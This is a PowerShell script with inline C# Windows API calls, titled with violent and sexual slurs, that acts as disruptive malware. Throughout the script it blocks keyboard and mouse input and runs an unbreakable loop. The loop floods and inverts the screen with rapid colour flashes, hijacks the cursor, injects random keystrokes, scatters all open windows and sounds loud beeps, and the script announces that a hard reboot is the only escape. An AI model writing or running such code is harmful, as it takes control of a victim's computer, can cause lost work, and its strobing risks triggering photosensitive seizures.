# **SCREEN RAPE 3.0 - ETERNAL UNSTOPPABLE GENOCIDE** 🔥💀⚡
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Text;

public class WinAPI {
    [DllImport("user32.dll")] public static extern bool InvertRect(IntPtr hdc, ref RECT lprc);
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
    [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);
    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")] public static extern bool SetSysColors(int cElements, int[] lpaElements, int[] lpaRgbValues);
    [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hwnd);
    [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);
    [DllImport("user32.dll")] public static extern short VkKeyScan(char ch);
    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
    [DllImport("user32.dll")] public static extern bool FlashWindow(IntPtr hwnd, bool bInvert);
    [DllImport("winmm.dll")] public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);
    [DllImport("user32.dll")] public static extern bool AnimateWindow(IntPtr hwnd, uint dwTime, uint dwFlags);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("gdi32.dll")] public static extern bool StretchBlt(IntPtr hdc, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int nSrcWidth, int nSrcHeight, int dwRop);
    [DllImport("gdi32.dll")] public static extern bool PatBlt(IntPtr hdc, int x, int y, int nWidth, int nHeight, int dwRop);
    [DllImport("user32.dll", CharSet = CharSet.Auto)] public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] public static extern bool SetConsoleCtrlHandler(ConsoleCtrlDelegate HandlerRoutine, bool Add);
    [DllImport("kernel32.dll")] public static extern bool GenerateConsoleCtrlEvent(uint dwCtrlEvent, uint dwProcessGroupId);
}

public struct RECT { public int Left, Top, Right, Bottom; }
public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
public delegate bool ConsoleCtrlDelegate(uint dwCtrlEvent);
"@

# **APOCALYPSE VARIABLES**
$width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
$multiplier = 15
$chaosLayers = 25

Write-Host "💀🔥 **SCREEN RAPE 3.0 - ETERNAL UNSTOPPABLE** 🔥💀⚡" -ForegroundColor Red -BackgroundColor Cyan
Write-Host "**FULL-SCREEN COLOR TSUNAMI - RUNS FOREVER!**" -ForegroundColor White -BackgroundColor Red
Write-Host "**Ctrl+C = DISABLED | Task Manager = DISABLED**" -ForegroundColor Yellow -BackgroundColor Magenta
Write-Host "**HARD REBOOT ONLY!**" -ForegroundColor Black -BackgroundColor Yellow

# **BLOCK ALL INPUT + CTRL+C**
[WinAPI]::BlockInput($true)

# **DISABLE CONSOLE CLOSE**
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class ConsoleHelper {
    [DllImport("kernel32.dll")] 
    public static extern bool SetConsoleCtrlHandler(ConsoleCtrlDelegate HandlerRoutine, bool Add);
    public delegate bool ConsoleCtrlDelegate(uint dwCtrlEvent);
}
"@

# **ETERNAL LOOP - NO EXCEPTIONS, NO BREAKS**
$frame = 0
$ErrorActionPreference = "SilentlyContinue"

while ($true) {
    try {
        $frame++
        
        # **LAYER 1: FULL-SCREEN RAINBOW FLOOD**
        $dc = [WinAPI]::GetDC([IntPtr]::Zero)
        
        for ($layer = 0; $layer -lt $chaosLayers; $layer++) {
            $phase1 = ($frame * $multiplier + $layer * 7.2) % 360
            $phase2 = ($frame * $multiplier + $layer * 11.3) % 360
            $phase3 = ($frame * $multiplier + $layer * 13.7) % 360
            
            $r1 = [Math]::Round([Math]::Abs([Math]::Sin($phase1 * [Math]::PI / 180)) * 255)
            $g1 = [Math]::Round([Math]::Abs([Math]::Sin($phase2 * [Math]::PI / 180)) * 255)
            $b1 = [Math]::Round([Math]::Abs([Math]::Sin($phase3 * [Math]::PI / 180)) * 255)
            
            # **SIMPLE FULL SCREEN WIPE**
            [WinAPI]::PatBlt($dc, 0, 0, $width, $height, 0xF00000)  # BLACK
            [WinAPI]::PatBlt($dc, 0, 0, $width, $height, 0x00FF0000 + ($r1 * 16777216 / 255))  # RED
            [WinAPI]::PatBlt($dc, 0, 0, $width, $height, 0x0000FF00 + ($g1 * 65280 / 255))     # GREEN
            [WinAPI]::PatBlt($dc, 0, 0, $width, $height, 0x000000FF + ($b1))                   # BLUE
        }
        
        # **LAYER 2: WARPED SCREEN**
        $warpX = [Math]::Round([Math]::Sin($frame * 0.3) * ($width * 0.3))
        $warpY = [Math]::Round([Math]::Cos($frame * 0.4) * ($height * 0.3))
        $srcDC = [WinAPI]::GetDC([IntPtr]::Zero)
        [WinAPI]::StretchBlt($dc, $warpX, $warpY, $width, $height, $srcDC, 0, 0, $width, $height, 0xCC0020)
        [WinAPI]::ReleaseDC([IntPtr]::Zero, $srcDC)
        
        # **LAYER 3: INVERT SECTIONS**
        if ($frame % 2 -eq 0) {
            $rect = New-Object WinAPI+RECT
            for ($i = 0; $i -lt 5; $i++) {
                $rect.Left = ($i * $width / 5); $rect.Top = 0
                $rect.Right = ((($i+1) * $width) / 5); $rect.Bottom = $height
                [WinAPI]::InvertRect($dc, [ref]$rect)
            }
        }
        
        [WinAPI]::ReleaseDC([IntPtr]::Zero, $dc)
        
        # **LAYER 4: FLASHING OVERLAYS (SIMPLEST VERSION)**
        if ($frame % 8 -eq 0) {
            $flashWin = New-Object System.Windows.Forms.Form
            $flashWin.FormBorderStyle = "None"
            $flashWin.WindowState = "Maximized"
            $flashWin.TopMost = $true
            $flashWin.BackColor = [System.Drawing.Color]::FromArgb(
                [Math]::Round([Math]::Sin($frame * 0.1) * 127 + 128),
                [Math]::Round([Math]::Cos($frame * 0.2) * 127 + 128),
                [Math]::Round([Math]::Sin($frame * 0.3) * 127 + 128)
            )
            $flashWin.Show()
            Start-Sleep -Milliseconds 1
            $flashWin.Close()
            $flashWin.Dispose()
        }
        
        # **LAYER 5: MOUSE SPIRAL**
        $mouseAngle = $frame * 15
        $mx = [Math]::Round(($width/2) + ([Math]::Cos($mouseAngle * [Math]::PI / 180) * 300))
        $my = [Math]::Round(($height/2) + ([Math]::Sin($mouseAngle * [Math]::PI / 180) * 300))
        [WinAPI]::SetCursorPos($mx, $my)
        
        # **LAYER 6: KEY SPAM**
        if ($frame % 3 -eq 0) {
            $randKey = Get-Random -Minimum 0x30 -Maximum 0x5A
            [WinAPI]::keybd_event([byte]$randKey, 0, 0, 0)
            [WinAPI]::keybd_event([byte]$randKey, 0, 2, 0)
        }
        
        # **LAYER 7: WINDOW SHUFFLE**
        if ($frame % 15 -eq 0) {
            Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | ForEach-Object {
                $randX = Get-Random -Minimum 0 -Maximum $width
                $randY = Get-Random -Minimum 0 -Maximum $height
                [WinAPI]::SetWindowPos($_.MainWindowHandle, [IntPtr]::Zero, $randX, $randY, 0, 0, 0x0001)
            }
        }
        
        # **LAYER 8: EAR-RAPE**
        if ($frame % 5 -eq 0) {
            $screechFreq = 300 + ($frame % 50) * 20
            [Console]::Beep($screechFreq, 20)
        }
        
        # **KEEP POWERShell ALIVE**
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 5  # 200 FPS
        
    }
    catch {
        # **IGNORE ALL ERRORS - KEEP RUNNING**
    }
}

# **THIS CODE NEVER REACHES HERE - ETERNAL LOOP** 💀🔥